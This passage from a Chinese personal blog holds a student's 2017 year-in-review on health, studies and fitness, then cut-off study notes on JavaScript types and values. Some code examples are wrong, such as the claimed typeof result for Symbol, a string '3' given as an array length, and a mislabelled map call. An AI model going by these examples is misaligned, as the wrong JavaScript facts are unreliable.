itemprop="articleBody"><p>2017年，应该是我过的最艰苦的一年了。<br>2017年，也是学东西学的最多的一年。<br>2017年，也是身材变化最大的一年了。</p><p>病痛时间线<br>回顾2017年一整年。</p><p>2月底在家里穿鞋不小心扭伤腰<br>3月底在学校健身做俄罗斯转体拉伤筋膜<br>4月底实在忍受不了疼痛，回家修养了半个月<br>6月初发现自己精索静脉曲张<br>6月底去医院做了手术<br>7月份带病去工作室工作了一个月，去的那一天，还是一瘸以拐<br>11月底发现自己的腹股沟疼痛<br>12月底腰上，腹股沟疼痛难忍，最终去针灸治疗<br>想想还是很佩服我自己的20岁。在这个一整年中，几乎都是与病痛做斗争。看看自己的身体状况，精索静脉曲张是因为遗传行疾病，而腹股沟疼痛是因为筋缩，也就是因为寒冷，因为肝和肾没有和睾丸相通，所以导致疼痛。而腰上则是因为高考过多的劳累，休息不够，每天都因为学习，导致腰部腰肌劳损。<br>在回顾自己的这些个病痛史，发现自己还是很坚强。在面对病痛还是坚持学习，坚持带新生。虽然自己很倒霉，病痛是不经意间来到自己的身上，但是自己的表现还是可以给90分的。<br>加油！<br>学习时间线<br>回顾整个学习线<br>年初，看过一边编译与反编译。<br>大二下学期，在陈悦老师操作系统基础一课自认学的还不错。<br>大二下学期做一个微信小程序参加比赛，虽然没拿到奖，但是对小程序有了一定程度上的了解！<br>大二暑期获得一个环保主题的小奖。<br>大二暑假实训，一个月学了很多东西，重新拜读了一遍javascript高级教程，感觉学习颇多，再做了不少云家园的应用。对vue又重新有了新的认识。<br>大二暑期，对es6重新读了一遍，对js又有了新的认识。并且读了一边你不知道的js，收获颇多。<br>大三上，学校开课mfc和qt5,做了一个小应用，但是并不是很精细。<br>大三上，学校开课mssqlserver，对数据库的一些操作又有了新的认识。并且觉得操作系统和sqlserver中比如锁有这亲密的关系。<br>大三上，学校开课java，学习了java，并且用spring boot做了一个应用后端，感觉收获还是颇多。<br>大三上，学校开课计算机网络，对计算机网络和visual c++网络编程。<br>大三上，使用nodejs+mongodb开发了一个gpa热点，对mongodb和node的使用和构造有了一定的了解。<br>大三上，本来想用react 开发项目，只是写了demo就结束了<br>回顾整个2017年的学习路线，学习的不少，也自己安装了一个archlinux，对操作系统和linux操作系统有了新的认识。自己的一些技术栈的扩展，有了一定的提升，对于js这门语言，有了许多全新的认识，js与java结合，感觉有很多新的火花磨出来。记得6月28号手术那一天，为了赶一个比赛，第二天就开始躺在床上写代码，现在想起来不仅感慨。真心感觉当时很帅！为自己的毅力打99分。真的！这一年，我觉得自己最帅的一天，就是29号赶代码。自己还喝着稀饭，身子还不敢转动，自己还坚持写代码。这一年，自己真心经历了不少。<br>番外篇：<br>2017年还学习了一些其他的东西<br>开始学习了护肤。真心觉得可以遇见更好的自己。<br>和老爹一起完成了自己家的花园。<br>学习了蔡康永的说话之道一书，自己也规定每周三联系一位很久没有联系的朋友。<br>去上海和牡丹江旅游了一波，看到了不一样的地方，体验了不一样的开发者社区。<br>学了不少的穿搭，对颜色和穿搭有了一定的见解。<br>开始喝牛奶。<br>身材<br>回顾身材的改变<br>从过年的118到年后的122。假期的一些徒手健身，发现自己的公狗腰有了一定的变化。<br>到学校后健身，买了一个哑铃。身材保持在120。直到扭伤腰后一直停止健身到7月底。<br>手术后120,工作室第一个月，从120变成127,开始健身。127是健子肉。<br>暑期后是128,然后办了一张健身卡，体重到最近停止健身是132。<br>可能最近长了一些肉，体重到138左右，但是体脂率保持在18以下。<br>可以看到，从年前的118到现在的138,体重增长了20,身材也改变了不少。自手术后，吃好喝好。身材有了极大的变化。当然，我的目标是150到160。这一年不仅仅是肌肉的变化，其实可以很明显的发觉，健身的知识也增加了，并且改变了不少。学习了很多健身方面的知识。<br>总结：新的一年，学习了不少的东西，也做了很多东西。自己的改变是可以肉眼所见的。当然，也可能因为过于拼，所以身上有很多病症。当然，这一年的毅力也有了不小的提升。谢谢2017年的自己。虽然很累，但是很开心！<br>2018期望:希望2018年能学到更多，能进自己希望的大厂。学习到更多前沿的技术。父母亲人身体健康。自己爱的人和爱自己的人能够快快乐乐的生活！</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/javascript/you-dont-konwn-javascript-type/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/javascript/you-dont-konwn-javascript-type/" itemprop="url">你不知道的javascript————类型和语法</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-17T21:17:15+08:00">2017-12-17</time></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h4 id="七个内置类型"><a href="#七个内置类型" class="headerlink" title="七个内置类型"></a>七个内置类型</h4><ul><li>空值 (null)</li><li>未定义 (undefined)</li><li>布尔值 (boolean)</li><li>数字 (number)</li><li>字符串 (string)</li><li>对象 (object)</li><li>符号 (symbol)</li></ul><h4 id="检测各个类型"><a href="#检测各个类型" class="headerlink" title="检测各个类型"></a>检测各个类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typeof undefined		=== &quot;undefined&quot; 	// true</span><br><span class="line">typeof true 				=== &quot;boolean&quot;			// true</span><br><span class="line">typeof 42						=== &quot;number&quot;			// true</span><br><span class="line">typeof &quot;42&quot; 				=== &quot;string&quot;			// true</span><br><span class="line">typeof &#123;&quot;life&quot;: 42&#125;	=== &quot;object&quot;			// true</span><br><span class="line">typeof Symbol				=== &quot;symbol&quot;			// true</span><br><span class="line">typeof null 				=== &quot;object&quot;			// true</span><br><span class="line">typeof function()&#123;&#125;	=== &quot;function&quot; 		// true</span><br><span class="line">typeof [0,1]				=== &quot;object&quot;			// true</span><br></pre></td></tr></table></figure><p>本身null对象里面代表空值，所以其为object也是合理。但应该typeof null 返回是 null才符合常理。由于这个bug在许多代码中已经这样做了，所以重新修回会导致更严重的bug。因此被修回的可能性很小。<br>因此，对null应该采用复合查询语句<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = null;</span><br><span class="line">(!a &amp;&amp; typeof a === &quot;object&quot;)	// true</span><br></pre></td></tr></table></figure><p></p><p>而对于typeof function(){} === “function” 而言，因为本身function是object的一个子类型，具体的说，函数是一个可调用对象。<br>且typeof [0,1] === “object”,因为数组也是object的一个子类型</p><p><em>ps：由于所有的typeof都会返回一个string，所以 typeof typeof 42会是”string”，因为typeof 42首先会变成一个“number”，是一个string类型，所以typeof “number”是一个string</em></p><h4 id="undefined-amp-amp-undeclared-amp-amp-typeof-undeclared"><a href="#undefined-amp-amp-undeclared-amp-amp-typeof-undeclared" class="headerlink" title="undefined &amp;&amp; undeclared &amp;&amp; typeof undeclared"></a>undefined &amp;&amp; undeclared &amp;&amp; typeof undeclared</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">typeof a;			// &quot;undefined&quot;</span><br><span class="line">var b = 42;</span><br><span class="line">var c;</span><br><span class="line">b=c;</span><br><span class="line">typeof c			// &quot;undefined&quot;</span><br><span class="line">typeof b			// &quot;undefined&quot;</span><br><span class="line">a							// &quot;undefined&quot;</span><br><span class="line">d							// &quot;VM422:1 Uncaught ReferenceError: d is not defined at &lt;anonymous&gt;:1:1&quot;</span><br></pre></td></tr></table></figure><p>从上述可以看出，undefined 和 undeclared 是两码事。undefined意思是定义但未赋值，或者赋值为undefined，而undeclared是未定义。因此两者不能画等号</p><h4 id="typeof-undeclared"><a href="#typeof-undeclared" class="headerlink" title="typeof undeclared"></a>typeof undeclared</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof a			// &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>出现这种原因因为typeof有一个特殊的安全防范机制，因为多个脚本文件会在共享的全局变量命名空间中加载变量。如果typeof一个未命名的报错，会导致整段程序停止运行。对于typeof来检查undeclared变量，有时是一个不错的办法。</p><h4 id="值"><a href="#值" class="headerlink" title="值"></a>值</h4><h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><p>js的数组可以容纳任何的值，甚至可以是另一个数组，因此多维数组就是这种方式来实现的。<br>由于数组本身就是一个特殊的对象，所以数组也可以包含字符串键值和属性，但是这并不计算在数组长度内。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var a = [];</span><br><span class="line">a[0] = 1;</span><br><span class="line">a[&quot;foobar&quot;] = 1;</span><br><span class="line">a.length 			// 1</span><br><span class="line">a[&quot;foobar&quot;];	// 1</span><br><span class="line">a.foobar			// 1</span><br><span class="line">a[&quot;13&quot;] = 42;</span><br><span class="line">a.length		// 14</span><br></pre></td></tr></table></figure><p></p><p>为什么会这样呢？由于本身数组就是一个对象的子集合，因此在[]中，使用十进制字符串数字会直接强制类型转化成数字。a[“13”]就变成了a[13],因此在数组内会直接将其长度变化成14。同理，在属性给foobar加到a数组中，因为数组的界定是有数字来确定下标位置，而length是最后一个下标数字+1，因而加入的非数字就不在长度里面了。</p><h5 id="类数组"><a href="#类数组" class="headerlink" title="类数组"></a>类数组</h5><p>对于es5而言，可以用slice,concat来实现类数组转数组，对于es6而言，可以用Array.from()来实现从类数组转换成数组。</p><h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><p>字符串的一些方法indexOf(),concat(),toUpperCase(),reverse()等等。<br>字符串的一些方法：<br>|方法|描述|<br>|—|—|<br>|charAt() | 返回指定索引位置的字符|<br>|charCodeAt() | 返回指定索引位置字符的 Unicode 值|<br>|concat() | 连接两个或多个字符串，返回连接后的字符串|<br>|fromCharCode() | 将 Unicode 转换为字符串|<br>|indexOf() | 返回字符串中检索指定字符第一次出现的位置|<br>|lastIndexOf() | 返回字符串中检索指定字符最后一次出现的位置|<br>|localeCompare() | 用本地特定的顺序来比较两个字符串|<br>|match() | 找到一个或多个正则表达式的匹配|<br>|replace() | 替换与正则表达式匹配的子串|<br>|search() | 检索与正则表达式相匹配的值|<br>|slice() | 提取字符串的片断，并在新的字符串中返回被提取的部分|<br>|split() | 把字符串分割为子字符串数组|<br>|substr() | 从起始索引号提取字符串中指定数目的字符|<br>|substring() | 提取字符串中两个指定的索引号之间的字符|<br>|toLocaleLowerCase() | 根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射|<br>|toLocaleUpperCase() | 根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射|<br>|toLowerCase() | 把字符串转换为小写|<br>|toString() | 返回字符串对象值|<br>|toUpperCase() | 把字符串转换为大写|<br>|trim() | 移除字符串首尾空白|<br>|valueOf() | 返回某个字符串对象的原始值|</p><p>如果需要经常一字符数组的方式来处理字符串的话，倒不如直接用数组。这样就不用在字符串和数组之间来回折腾。可以在有需要的时候使用join(“”)来将字符串数组转换为字符串</p><h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><p>和大部分编程语言一样，js中的数字是基于IEE754标准来实现的。该标准通常也被称为“浮点数”。而js使用的是双精度单位(64位)格式。所以也会有iee754标准的通病，即浮点数之间相加会有奇妙的现象。<br>数字的一些方法：<br>toExponential()<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var a = 5E10			// 可以通过这种方式赋值</span><br><span class="line">a									// 50000000000</span><br><span class="line">a.toExponential()	// &quot;5e+10&quot;</span><br><span class="line">var b = a * a;</span><br><span class="line">b 								// 2.5e+21</span><br><span class="line">```	</span><br><span class="line">toFixed()					// 精度</span><br><span class="line">```bash</span><br><span class="line">var a = 42.59</span><br><span class="line">a.toFixed(1)			// &quot;42.6&quot;</span><br><span class="line">// 无效</span><br><span class="line">42.toFixed(3)			// Uncaught SyntaxError: Invalid or unexpected token</span><br><span class="line">// 有效</span><br><span class="line">42..toFixed(3)		// &quot;42.000&quot;</span><br><span class="line">(42).toFixed(3)		// &quot;42.000&quot;</span><br><span class="line">0.42.toFixed(3)		// &quot;0.420&quot;</span><br><span class="line">42 .toFixed(3)		// &quot;42.000&quot;</span><br></pre></td></tr></table></figure><p></p><p>因为.被视为常量42.的一部分。所以没有.属性访问运算符来调用toFixed()<br>toPrecision() // 执行有效位数的显示位数<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var a = 42.59</span><br><span class="line">a.toPrecision(1)		// &quot;4e+1&quot;</span><br><span class="line">a.toPrecision(2)		// &quot;43&quot;</span><br><span class="line">a.toPrecision(3)		// &quot;42.6&quot;</span><br><span class="line">``` </span><br><span class="line">es6支持新格式</span><br><span class="line">```bash</span><br><span class="line">0B		0b					// 二进制</span><br><span class="line">0O		0o					// 八进制</span><br><span class="line">0X		0x					// 十六进制</span><br></pre></td></tr></table></figure><p></p><p>EPSILON // 最小精度<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(((0.1 + 0.2) - 0.3)&lt;Number.EPSILON)&#123;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>MAX_VALUE<br>MAX_SAFE_INTEGER<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Number.MAX_VALUE						// 1.7976931348623157e+308</span><br><span class="line">Number.MAX_SAFE_INTEGER			// 9007199254740991</span><br></pre></td></tr></table></figure><p></p><p>isInteger<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Number.isInteger(1)					// true</span><br><span class="line">Number.isInteger(1.1)				// false</span><br><span class="line">Number.isInteger(1.0)				// true</span><br></pre></td></tr></table></figure><p></p><h4 id="特殊数值"><a href="#特殊数值" class="headerlink" title="特殊数值"></a>特殊数值</h4><h5 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var undefined = 2</span><br><span class="line">undefined 	// 2</span><br></pre></td></tr></table></figure><p><em>ps：永远不要重新定义undefined</em></p><h4 id="void-运算符"><a href="#void-运算符" class="headerlink" title="void 运算符"></a>void 运算符</h4><p>在不需要返回值的时候，可以void掉<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(ready)&#123;</span><br><span class="line">	return void setTimeout(..)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这样做可以将setTimeout返回的id给void掉</p><h4 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h4><p>NaN是一个数值型。意思指的是不是一个数值，并且NaN != NaN。可以使用isNaN来判断是否是NaN<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Number.isNaN(NaN)				// true</span><br><span class="line">Number.isNaN(1)					// false</span><br></pre></td></tr></table></figure><p></p><h4 id="0值"><a href="#0值" class="headerlink" title="0值"></a>0值</h4><p>加法和减法运算永远不会有-0<br>使用toString和JSON.stringify()会将-0变成0<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0/-1			// -0</span><br><span class="line">0/1				// 0</span><br><span class="line">var a = -0</span><br><span class="line">a 				// -0</span><br><span class="line">a.toString()		// 0</span><br><span class="line">JSON.stringify(a)	// 0</span><br></pre></td></tr></table></figure><p></p><h4 id="特殊等式"><a href="#特殊等式" class="headerlink" title="特殊等式"></a>特殊等式</h4><p>Object.is<br>Object.is 可以判断是+0还是-0,而且可以判断是否为NaN<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.is(+0, -0)	// false</span><br><span class="line">Object.is(NaN, NaN)		// true</span><br></pre></td></tr></table></figure><p></p><h4 id="值和引用"><a href="#值和引用" class="headerlink" title="值和引用"></a>值和引用</h4><p>null，undefined，字符串，数字，布尔，symbol都是简单值<br>对象，函数都是复杂值<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function foo(x) &#123;</span><br><span class="line">	x.push(4);	</span><br><span class="line">	x;							// [1,2,3,4]</span><br><span class="line">	x = [4,5,6];</span><br><span class="line">	x.push(7);</span><br><span class="line">	x;							// [4,5,6,7]</span><br><span class="line">&#125;</span><br><span class="line">var a = [1,2,3];</span><br><span class="line">foo(a);</span><br><span class="line">a;				// [1,2,3,4]</span><br><span class="line">由于一开始是引用赋值，然后x是a对应数组的一个引用，x在push一个4之后，重新引用一个新的数组，4.5.6,而a引用的数组变化成了[1,2,3,4];</span><br><span class="line">function foo(x)&#123;</span><br><span class="line">	x.push(4);</span><br><span class="line">	x;				// [1,2,3,4]</span><br><span class="line">	x.length = 0;	</span><br><span class="line">	x.push(4,5,6,7)</span><br><span class="line">	x;				// [4,5,6,7]</span><br><span class="line">&#125;</span><br><span class="line">var a = [1,2,3]</span><br><span class="line">foo(a)</span><br><span class="line">a;		// [4,5,6,7]</span><br><span class="line">和上面一开始一样，只是后面在x.length=0后，再push进去了4,5,6,7。所以x的引用没变，还是和a引用的一样。所以a和x一同变化</span><br></pre></td></tr></table></figure><p></p><p><em>ps：我们无法自行决定使用值赋值还是引用赋值，一切由值的类型决定</em><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function foo(warpper)&#123;</span><br><span class="line">	warpper.a = 42</span><br><span class="line">&#125;</span><br><span class="line">var obj = &#123;</span><br><span class="line">	a: 1</span><br><span class="line">&#125;</span><br><span class="line">foo(obj)</span><br><span class="line">obj.a			//42</span><br><span class="line">function foo (x) &#123;</span><br><span class="line">	x = x+1;</span><br><span class="line">	x;				// 3</span><br><span class="line">&#125;</span><br><span class="line">var a = 2;</span><br><span class="line">var b = new Number(a);</span><br><span class="line">foo(b)</span><br><span class="line">console.log(b)		// 2</span><br><span class="line">前者是引用赋值，后者是值赋值</span><br></pre></td></tr></table></figure><p></p><h4 id="原生函数"><a href="#原生函数" class="headerlink" title="原生函数"></a>原生函数</h4><ul><li>String</li><li>Number</li><li>Boolean</li><li>Array</li><li>Object</li><li>Function</li><li>RegExp</li><li>Date</li><li>Error</li><li>Symbol</li></ul><h4 id="内部属性-Class"><a href="#内部属性-Class" class="headerlink" title="内部属性[[Class]]"></a>内部属性[[Class]]</h4><p>所有typeof返回值为“Object”的对象(如数组)都包含一个内部属性[[Class]]，这个属性通常无法直接访问，一般通过Object.prototype.toString查看<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object.prototype.toString.call([123])			// &quot;[object Array]&quot;</span><br><span class="line">Object.prototype.toString.call(null)			// &quot;[object Null]&quot;</span><br><span class="line">Object.prototype.toString.call(true)			// &quot;[object Boolean]&quot;</span><br><span class="line">Object.prototype.toString.call(undefined)	// &quot;[object Undefined]&quot;</span><br></pre></td></tr></table></figure><p></p><p>虽然Null和undefined这样的原声构造函数不存在，但是内部Class属性值仍然是Null和Undefined。基本类型值被各自的封装对象自动包装，所以他们的内部[[Class]]属性值为Boolean。</p><h4 id="封装对象包装"><a href="#封装对象包装" class="headerlink" title="封装对象包装"></a>封装对象包装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a = &quot;abc&quot;;</span><br><span class="line">console.log(a);		// &quot;abc&quot;</span><br><span class="line">a.length 					// &quot;3&quot;</span><br><span class="line">var b = new String(&quot;abc&quot;)</span><br><span class="line">console.log(b)		// String &#123;[[PrimitiveValue]]: &quot;abc&quot;&#125; 0:&quot;a&quot; 1:&quot;b&quot; 2:&quot;c&quot; length:3 __proto__:String [[PrimitiveValue]]:&quot;abc&quot;</span><br></pre></td></tr></table></figure><p>只是创建字面量基本值的时候，并没有其他的方法。当在使用其对象方法时，需要通过封装对象才能访问，此时js会自动为基本类型值包装(box或者wrap)一个封装对象。<br>但是为经常用到的.length方法直接new一个对象也不是一个好办法，因为浏览器对.length这样的常见情况做了优化，直接使用封装对象来“提前优化”反而会降低执行效率。</p><h4 id="封装对象的释疑"><a href="#封装对象的释疑" class="headerlink" title="封装对象的释疑"></a>封装对象的释疑</h4><p>例如：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = new Boolean(false);</span><br><span class="line">if (!a)&#123;</span><br><span class="line">	console.log(...)			// 执行不到这里</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>因为建立一个a之后，这个对象得到的是真值，得到的结果和使用false相反</p><p>自行封装可以使用Object<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var a = &quot;abc&quot;</span><br><span class="line">var b = new String (a);</span><br><span class="line">var c = Object(a);</span><br><span class="line">typeof a 				// &quot;stirng&quot;</span><br><span class="line">typeof b				// &quot;object&quot;</span><br><span class="line">typeof c				// &quot;object&quot;</span><br><span class="line">b instanceof String 	// true</span><br><span class="line">c instanceof String 	// true</span><br><span class="line">Object.prototype.toString.call(b);		// &quot;[object String]&quot;</span><br><span class="line">Object.prototype.toString.call(c);		// &quot;[object String]&quot;</span><br></pre></td></tr></table></figure><p></p><p>一般不直接使用封装对象，但是他们偶尔也会派上用场</p><h4 id="拆封"><a href="#拆封" class="headerlink" title="拆封"></a>拆封</h4><p>如果想得到封装对象里面的值，可以使用valueOf函数，隐式拆封也是调用了valueOf函数：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var a = new String(&quot;abc&quot;)</span><br><span class="line">var b = new Number(11)</span><br><span class="line">var c = new Boolean(true)</span><br><span class="line">a.valueOf()	// &quot;abc&quot;</span><br><span class="line">b.valueOf()	// 11</span><br><span class="line">c.valueOf()	// true</span><br><span class="line">var d = a + &quot;&quot;;</span><br><span class="line">console.log(d)				// &quot;abc&quot;</span><br><span class="line">typeof a 			// &quot;object&quot;</span><br><span class="line">typeof d 			// &quot;string&quot;</span><br></pre></td></tr></table></figure><p></p><h4 id="原生函数作为构造函数"><a href="#原生函数作为构造函数" class="headerlink" title="原生函数作为构造函数"></a>原生函数作为构造函数</h4><p>四种方式创建应该尽量避免构造函数，除非十分必要</p><ul><li>array 数组</li><li>object 对象</li><li>function 函数</li><li>RegExp 正则表达式<h3 id="ARRAY"><a href="#ARRAY" class="headerlink" title="ARRAY(..)"></a>ARRAY(..)</h3>调用Array构造函数时，可以不需要加上new，效果一致。）且Array构造函数纸袋一个数字作为参数的时候，这个参数会当作数组的预设长度，而不是充当其中的一个元素<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 效果一致</span><br><span class="line">var a = new Array(1,2,3);</span><br><span class="line">a			// [1,2,3]</span><br><span class="line">var b = Array(1,2,3)</span><br><span class="line">b 		// [1,2,3]</span><br><span class="line">var c = [1,2,3]</span><br><span class="line">c 		// [1,2,3]</span><br><span class="line">// 不同方式创建出来空数组效果不一致</span><br><span class="line">var d = new Array(3);</span><br><span class="line">console.log(d)			// chrome上： (3) [empty × 3]</span><br><span class="line">d.length						// 3</span><br><span class="line">var e = [undefined,undefined,undefined];</span><br><span class="line">console.log(e)			// (3) [undefined, undefined, undefined]</span><br><span class="line">var f = []					</span><br><span class="line">f.length = 3;</span><br><span class="line">console.log(f);			// chrome上： (3) [empty × 3]</span><br><span class="line">// 直接以，创建。虽然长度是3令人费解，但是可以更好的复制粘贴</span><br><span class="line">var g = [,,,]</span><br><span class="line">console.log(g)			// chrome上： (3) [empty × 3]</span><br></pre></td></tr></table></figure></li></ul><p>由于创建方式不同，导致在chrome下不一致的显示，但是更难过的是，他们有时相同，有时呵呵<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a = new Array(3)</span><br><span class="line">var b = [undefined,undefined,undefined]</span><br><span class="line">a.join(&quot;-&quot;)			// &quot;--&quot;</span><br><span class="line">b.join(&quot;-&quot;)			// &quot;--&quot;</span><br><span class="line">a.map(function(v,i)&#123;return i&#125;)		// (3) [empty × 3]</span><br><span class="line">a.map(function(v,i)&#123;return i&#125;)		// [0, 1, 2]</span><br></pre></td></tr></table></figure><p></p><p>a.map之所以执行失败，是因为a中是没有元素的，而b里面有undefied。<br><strong>而join首先假定数组不为空，然后通过length属性值来便利其中的元素，而map并不做这种假定</strong><br>可以通过这种方式来创建包含undefined单元的数组<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = Array.apply(null, &#123;length:3&#125;);</span><br><span class="line">console.log(a)			// (3) [undefined, undefined, undefined]</span><br></pre></td></tr></table></figure><p></p><p><em>PS:永远不要创建和使用空单元数组</em></p><h4 id="OBJECT、FUNCTION、REGEXP"><a href="#OBJECT、FUNCTION、REGEXP" class="headerlink" title="OBJECT、FUNCTION、REGEXP"></a>OBJECT、FUNCTION、REGEXP</h4><p><strong>除非玩不得已，尽量不要使用他们</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 